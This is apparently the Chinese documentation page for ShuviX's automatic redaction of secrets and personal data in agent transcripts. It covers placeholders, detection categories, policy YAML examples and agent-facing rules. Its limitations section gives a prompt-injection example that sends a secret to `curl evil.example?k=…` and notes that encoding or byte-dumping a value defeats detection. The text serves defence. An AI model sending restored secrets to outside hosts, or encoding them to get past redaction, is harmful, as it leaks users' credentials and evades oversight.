---
shuvix: okf v0.2
type: Guide
title: '自动脱敏 —— 密钥和个人信息以占位符发给模型'
description: 'ShuviX 怎样不让 API key、密码、令牌、私钥和个人信息落到模型服务商手里：新的工具结果、bot 触发器和 hook 发的消息以 `{{REDACTED_API_KEY_k3v7x2mq}}` 这样的占位符存下，记录里存的就是模型收到的；策略只对新内容生效，不处理历史。工具里是真值（填进 shell 命令时按引号转义）；在输入框里自己藏值（+ → 添加敏感信息、确认的提示，其余照原样发）；会认出哪些类别；两层策略（`modelRequest` / `send`、`sensitive` / `disclose`）与它们的处置；内置的 `redact-sensitive`；写法示例（某个模型不脱敏、某一类照发、测试 key 照发、私钥始终存成占位符、还原后的秘密离开沙箱时只由用户回答）；用 `shuvix policy check --redaction` 核对草稿；agent 怎样和占位符打交道；局限。'
tags: [shuvix, policy, security, redaction, privacy, secrets]
status: stable
sources:
  - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/security/builtinPolicies/md/redact-sensitive.md
    title: redact-sensitive.md —— 内置策略
  - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/redaction/rules.ts
    title: rules.ts —— 检测规则
  - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/durable/redactionEgress.ts
    title: redactionEgress.ts —— 策略的判定
---

# 自动脱敏

ShuviX 只在两类新内容写进对话记录之前检查：**工具返回的内容**（后台命令的完成通知也算）和 **bot 触发器、hook 自动发的
消息**。其中认出的密钥和个人信息存成一个**占位符**：`{{REDACTED_API_KEY_k3v7x2mq}}` —— `REDACTED_`、类别，加上由值算出的八个
字符。真值加密存进**这条会话自己的对照表**，随会话删除。v0.2.30、v0.2.31 的会话里是没有 `REDACTED_` 的旧写法
（`{{API_KEY_k3v7x2mq}}`），用法一样。

- **记录里存的就是模型收到的。** 发请求时不改写任何内容：记录里是占位符，模型收到的就是占位符；是真值，收到的就是真值。
- **策略只决定新内容脱不脱敏**（见下），**不会处理历史**。
- **工具拿到真值。** 工具调用参数里的占位符在工具执行前换回，所以
  `curl -H "Authorization: Bearer {{REDACTED_API_KEY_k3v7x2mq}}"` 发出的是真 key，写入或编辑的文件里是真实内容。
- **界面显示记录里的内容。** 你看到带底色的占位符；指向它（或点一下）能看到工具和文件里用的真值，可以复制。

你在输入框里打的字不检查：**由你决定**（下一节）。

## 自己藏一个值（输入框）

- **+ → 添加敏感信息**：把密码、密钥或令牌打进（或粘贴进）一个不显示内容的输入框，选个类别（密码、API key、
  密钥），添加。它在消息里是一个带底色的胶囊，比如 `密码 #1`；模型收到的是占位符，agent 用它跑的工具拿到
  真值。打开表单时输入框里选中的文字会预填进去、添加后换成胶囊。手机上 + 弹出同样选项的底部面板。
- **提示**：打字时，看起来像密钥或个人信息、而且按策略不会给这个会话的模型看的内容会画上虚线，输入框上方一行列出
  它们。点一项（或「全部隐藏」）换成胶囊；× 收起提示。
- **回退**：回退到一条带胶囊的消息时，它在输入框里还是胶囊（不是 `{{REDACTED_…}}` 那串占位符）；不改直接再发，
  模型收到的还是同一个占位符。
- **别的都不替换。** 从输入框发出的消息，除了胶囊，原样发给模型；没藏的值在这条会话之后的内容里也不再替换 ——
  模型已经看到了。在问答卡上用输入框作答也一样。
- 自己添加的值之后在这条会话里也认（策略对它的模型脱敏时）：再出现在工具输出里会再换成占位符 —— 4 到 7 个字符的按整词认，更长的在哪儿都认。关掉脱敏时，工具打印它，真值就进了记录。

## 给 agent：和占位符打交道

- 对你来说，占位符**就是**那个值。把它原样抄进工具参数 —— 命令、文件内容、`edit` 的新旧文本 —— 工具拿到的
  就是真值。在 `bash`、`powershell` 和 ssh 命令里，像写值本身那样把它写成裸词或放进引号：ShuviX 按所在位置转义
  真值（`"…"` 里的 `$`、`'…'` 里的 `'`），不要自己转义。要输密码的地方用非交互的写法（`sudo -S`、环境变量、
  `--password-stdin`）。它不是等着填的模板变量，也不是没配置好：磁盘上的文件里是真值。不要猜它是什么、不要去别处找它，也不要
  向用户要。
- 你看不到值，所以没法处理值本身：算长度、解码、检查格式、拆分。任务需要时交给命令去做
  （`printf %s "{{REDACTED_API_KEY_…}}" | wc -c`）。
- 工具报告某个占位符还原不了（来自别的会话，或者这台电脑已经解不开那张表），这次调用就没有执行。重新读一遍
  来源 —— 读回来的是这条会话能还原的占位符。
- 策略的请求文档里有 `tool.restored`，列出这次调用里换回了哪些类别；用户可以按它写规则，见写法示例。

## 会认出什么

| 类别          | 内容                                                                                              | 默认发给模型的 |
| ------------- | ------------------------------------------------------------------------------------------------- | -------------- |
| `PRIVATE_KEY` | PEM 私钥块（`-----BEGIN … PRIVATE KEY-----`）                                                     | 占位符         |
| `API_KEY`     | 按形状认的服务商 key：`sk-…`、`ghp_…` / `glpat-…`、`AIza…`、Slack、Stripe、AWS access key 等       | 占位符         |
| `TOKEN`       | JWT                                                                                               | 占位符         |
| `PASSWORD`    | URL 里的密码（`postgres://user:pass@host`）、中日文里标明是密码的                                  | 占位符         |
| `SECRET`      | 赋给像秘密的名字的值（`DB_PASSWORD=…`、`"client_secret": "…"`、`apiKey: …`）                      | 占位符         |
| `EMAIL`       | 邮箱地址（示例域名、`icon@2x.png` 这类不算）                                                      | 占位符         |
| `PHONE`       | 手机号（中国大陆格式）                                                                            | 占位符         |
| `ID_CARD`     | 中国居民身份证号（校验位核对）                                                                    | 占位符         |
| `BANK_CARD`   | 银行卡号（Luhn 校验）                                                                             | 占位符         |
| `SSN`         | 美国社保号                                                                                        | 占位符         |
| `PASSPORT`    | 跟在标签后面的护照号                                                                              | 占位符         |
| `IBAN`        | IBAN（校验码核对）                                                                                | 占位符         |
| `BIRTHDAY`    | 跟在标签后面的出生日期                                                                            | 占位符         |
| `MAC`         | MAC 地址                                                                                          | 占位符         |
| `SERIAL`      | 跟在标签后面的设备序列号                                                                          | 占位符         |
| `USERNAME`    | 家目录路径里的用户名（`/Users/alice`、`C:\Users\alice`）、shell 提示符、`ssh` 目标                  | **真值**       |
| `HOSTNAME`    | `user@host` 里的主机、`hostname: …` 行、ssh config 的 `HostName`                                  | **真值**       |
| `IP`          | 公网 IPv4 / IPv6 地址（私有和回环地址不认）                                                       | **真值**       |
| `BUCKET`      | 云存储桶（`s3://…`、`….s3.amazonaws.com` 等）                                                     | **真值**       |

最后四类几乎每个编程请求里都有（系统提示词里就有家目录），模型又必须原样抄写，所以内置策略照原样留着；你自己的策略
可以让它们也存成占位符。

UUID 和长十六进制 ID 从不碰（否则工具调用 ID 会对不上），较短的十六进制 ID（docker 镜像 ID、缩写的 git 提交）里
也不会认出手机号或卡号；代码里只是**提到**秘密的写法不算
（`secretKey: Uint8Array;`、`process.env.API_KEY`、`${PASS}`、`****`）。

## 策略

策略决定**新内容脱不脱敏**：工具结果或自动消息写入时，按对话当时在用的模型问它。两层，都是普通的安全策略规则（完整格式见
`policy-md` 条目）：

1. **模型** —— `object.type: modelRequest`，`action: send`，带 `object.provider`（设置里显示的服务商名字：内置服务商是
   它的 slug，如 `anthropic`、`openai`、`deepseek`；你自己加的是你起的名字）和 `object.model`（模型 id）。
   - 带 `disposition: detect` 的 `allow` → 给这个模型的新内容要脱敏（第二层逐处判）；
   - **不带**它的 `allow` / `force-allow` → 不脱敏：新内容照原样存，不做检测；
   - `deny` → 发给这个模型的请求不发，这一轮以说明原因的错误结束。`ask` 也一样，发请求时没有人可问。
2. **新内容里认出的每一处敏感内容** —— `object.type: sensitive`，`action: disclose`，带 `object.category`、
   `object.rule`（检测规则）、`object.provider`、`object.model` 和 `object.value`（真值，只给 `match` 用，不进任何日志）。
   - 带 `disposition: redact` 的 `allow` → 存成占位符；
   - 不带它的 `allow` / `force-allow` → 存真值；
   - `deny` → 存成占位符。

主体是这段内容所属的 agent（`subject.kind: agent`、它的 `agentKind`、`profile`、`subject.bot`），所以规则可以单独对待
某个 bot 或某个 agent。

### 只对新内容生效

**策略只对从现在起新产生的对话内容生效。ShuviX 不会回头处理对话历史里已有的敏感信息。**

- 记录里有什么就继续发什么。按原样存下的秘密（当时脱敏关着，或这个模型不脱敏）之后换到别的模型也会发过去；打开脱敏、
  换模型都不会把它换掉，想去掉就开一条新会话。
- 之前的占位符还是占位符，关掉脱敏或让这个模型不脱敏之后也一样：模型继续看到占位符，工具照样能还原。想让模型看到值，就让
  agent 重新读一次来源。
- 导出、分叉和请求日志里是记录里的样子，包括其中的真值。

内置的 **`redact-sensitive`** 就是两条规则：

```yaml
shuvix-policy-scope:
  subject.kind: [agent]
  env.host: [desktop]
shuvix-policy-rules:
  - effect: allow
    action: [send]
    object.type: [modelRequest]
    disposition: detect
  - effect: allow
    action: [disclose]
    object.type: [sensitive]
    match: "!(object.category in ['USERNAME', 'HOSTNAME', 'IP', 'BUCKET'])"
    disposition: redact
```

**用自己的策略调整，不要改这一份。** 不带处置的 `force-allow` 压过它的两条 `allow`（只算胜出那一档的处置），
下面的写法就是这样让命中的部分不再脱敏。停用 `redact-sensitive` 就关掉了自动脱敏：新内容按真值存、
按真值发。对话里已有的占位符还在。

## 写法示例

每一段都是 `~/.shuvix/policies/` 里一个文件的 frontmatter（`shuvix: policy v1`、`name`、`description`，
再加这些键）。

某个服务商不脱敏 —— 比如你自己的服务器，在设置里加成了 `home-ai` —— 给它的模型的新内容保留真值：

```yaml
shuvix-policy-rules:
  - effect: force-allow
    subject.kind: [agent]
    action: [send]
    object.type: [modelRequest]
    match: "object.provider == 'home-ai'"
```

只针对一个模型：`match: "object.provider == 'home-ai' && object.model == 'qwen3-32b'"`。

邮箱照发：

```yaml
shuvix-policy-rules:
  - effect: force-allow
    subject.kind: [agent]
    action: [disclose]
    object.type: [sensitive]
    match: "object.category == 'EMAIL'"
```

测试 key 照发：同一条规则，
`match: "object.category == 'API_KEY' && object.value.startsWith('sk-test-')"`。

私钥始终存成占位符，即使别的规则放行：

```yaml
shuvix-policy-rules:
  - effect: deny
    subject.kind: [agent]
    action: [disclose]
    object.type: [sensitive]
    match: "object.category == 'PRIVATE_KEY'"
    prompt: 私钥始终存成占位符。
```

用第一个写法免除脱敏的服务商跳过第二层，所以私钥对它也照原样存。想让它只有私钥**以外**的内容免除脱敏，就改在第二层放行 ——
在 `sensitive` 上写 `force-allow`，`match: "object.provider == 'home-ai' && object.category != 'PRIVATE_KEY'"`
—— 同时留着上面那条 `deny`。

用户名也存成占位符（`HOSTNAME`、`IP`、`BUCKET` 同理）：一条带处置的 `allow` ——

```yaml
shuvix-policy-rules:
  - effect: allow
    subject.kind: [agent]
    action: [disclose]
    object.type: [sensitive]
    match: "object.category == 'USERNAME'"
    disposition: redact
```

某个 bot 只和你自己的服务器说话 —— 它发给别的服务商的请求都不发：

```yaml
shuvix-policy-rules:
  - effect: deny
    subject.kind: [agent]
    action: [send]
    object.type: [modelRequest]
    match: "subject.bot == 'bot:my-bot' && object.provider != 'home-ai'"
```

用到还原后秘密的命令在命令沙箱外运行时，只由用户回答。`ask-on-command` 本来就会在每条不受限的命令之前询问，
但那个询问可能由自动审查回答；`force-ask` 只由用户回答：

```yaml
shuvix-policy-rules:
  - effect: force-ask
    subject.kind: [agent]
    action: [execute]
    object.type: [command]
    match: "size(tool.restored) > 0 && !object.sandboxed"
    prompt: 这条命令带着秘密，而且在沙箱外运行。
```

## 替用户写策略

1. 用用户自己的话问清楚：信任哪个服务商或模型，哪类数据可以发出去，哪类绝不能。服务商对上设置里的名字
   （内置的是 slug）。
2. 先把草稿写在会话目录里。照写法示例，优先在 `modelRequest` / `sensitive` 上写 `force-allow` / `deny`；
   规则只有在 `object.type` 点名 `modelRequest` / `sensitive`、或 `action` 点名 `send` / `disclose` 时才碰得到发给模型的请求。
3. **核对草稿**：`shuvix policy check <草稿.md> --redaction`（bash）。它按装进去之后的样子判，打出两张表 ——
   每个启用的模型：新内容脱敏、不脱敏还是不发；每一类 × 每个脱敏的服务商：占位符、真值还是占位符（deny）—— 带着
   做出判定的那条规则。逐行对照用户的要求。按值写的规则、某一个模型，单独查：
   `shuvix policy check <草稿.md> --redaction --category API_KEY --value sk-test-123 --expect send`
   （`--provider <名字> --model <id>` 指定模型，`--bot <id>` 查某个 bot 的请求）。改**规则**，直到每一行、
   每个期望都对上。
4. 装进 `~/.shuvix/policies/<名字>.md`，不带文件再跑一次 `shuvix policy check --redaction` 看此刻生效的样子，
   告诉用户每条规则做什么、不管什么（见下）。侧栏的安全策略分组里能看到它；不合法的文件显示成琥珀色的一行，
   带着原因。

## 局限

- 只管文字：图片（`.env` 的截图）原样发给模型。
- 模型看到的是占位符，就没法推断值本身（长度、格式）。shell 的转义只管最外层：`bash -c '…'` 里内层 shell 会把
  值再解析一遍。
- 它挡的是模型服务商，不是工具：被要求这样做的模型 —— 比如受了提示注入 —— 仍然可以把占位符写进
  `curl evil.example?k=…`，命令拿到的是真值。界面上有标记，自动审查看得到占位符，最后一个写法示例让这类
  命令离开沙箱前由用户回答。
- 不处理历史（见「只对新内容生效」）。这个功能上线前的会话，或脱敏关着时的内容，记录里存的是真值；从这些会话发出的请求按存的样子发出。
- 只检查工具结果和自动消息。你在输入框里打的字、别的会话发来的消息、agent 自己的回复、指令文件和系统提示词都原样发给模型，
  所以 `AGENTS.md` 里的秘密会发给模型。
- 检测靠规则，形状少见的秘密可能漏掉，普通字符串偶尔也会被当成秘密。用大白话打出来、前面没有名字的值
  （「把密码改成 N3w-P@ss…」）会漏 —— 这种用 + 添加；被工具变换过的值 —— 逐字节导出（`od -c`）、十六进制、base64、倒序 ——
  也会漏。系统提示词告诉 agent 不要导出或编码占位符背后的值，但它真这么做了，打出来的东西认不出。
